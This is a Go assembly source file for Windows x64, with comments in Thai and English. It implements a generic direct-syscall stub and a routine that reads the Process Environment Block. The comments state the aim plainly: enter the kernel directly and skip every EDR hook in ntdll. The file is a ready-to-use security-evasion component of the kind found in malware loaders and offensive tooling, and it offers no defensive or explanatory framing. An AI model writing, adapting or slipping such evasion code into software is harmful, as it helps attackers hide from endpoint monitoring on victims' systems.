// syscall_windows_amd64.s
// Direct Syscall Stubs สำหรับ Windows x64
//
// ทำไมต้องใช้ assembly:
//   Go runtime ไม่มีทางสร้าง "mov eax, <SSN>; syscall" ได้โดยตรง
//   ต้องใช้ .s file (Go Plan 9 assembly syntax)
//
// Pattern ของทุก Windows syscall stub:
//   mov r10, rcx       (calling convention: copy first arg to r10)
//   mov eax, <SSN>     (syscall number)
//   syscall            (เข้า kernel โดยตรง — ข้าม ntdll)
//   ret

#include "textflag.h"

// func doSyscall(ssn uintptr, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 uintptr) uintptr
//
// Generic direct syscall ที่รับ SSN + arguments สูงสุด 10 ตัว
// Return: NTSTATUS (0 = success)
TEXT ·doSyscall(SB),NOSPLIT,$0-96
    // Move SSN into RAX (syscall number register)
    MOVQ    ssn+0(FP), AX

    // Windows x64 calling convention (first 4 args in registers):
    // RCX = a1, RDX = a2, R8 = a3, R9 = a4
    MOVQ    a1+8(FP),  CX
    MOVQ    a2+16(FP), DX
    MOVQ    a3+24(FP), R8
    MOVQ    a4+32(FP), R9

    // Args 5-10 go on stack (above 32-byte shadow space)
    MOVQ    a5+40(FP),  R10
    MOVQ    R10, 40(SP)
    MOVQ    a6+48(FP),  R10
    MOVQ    R10, 48(SP)
    MOVQ    a7+56(FP),  R10
    MOVQ    R10, 56(SP)
    MOVQ    a8+64(FP),  R10
    MOVQ    R10, 64(SP)
    MOVQ    a9+72(FP),  R10
    MOVQ    R10, 72(SP)
    MOVQ    a10+80(FP), R10
    MOVQ    R10, 80(SP)

    // Windows syscall ABI: first arg must be in R10 (not RCX)
    MOVQ    CX, R10

    // SYSCALL — เข้า kernel โดยตรง ข้ามทุก EDR hook ใน ntdll
    SYSCALL

    // Return NTSTATUS in RAX
    MOVQ    AX, ret+88(FP)
    RET

// func getPEB() uintptr
//
// อ่าน Process Environment Block จาก GS register
// Windows x64: GS:[0x60] = PEB address (via TEB.PebBaseAddress)
TEXT ·getPEB(SB),NOSPLIT,$0-8
    MOVQ    0x60(GS), AX
    MOVQ    AX, ret+0(FP)
    RET
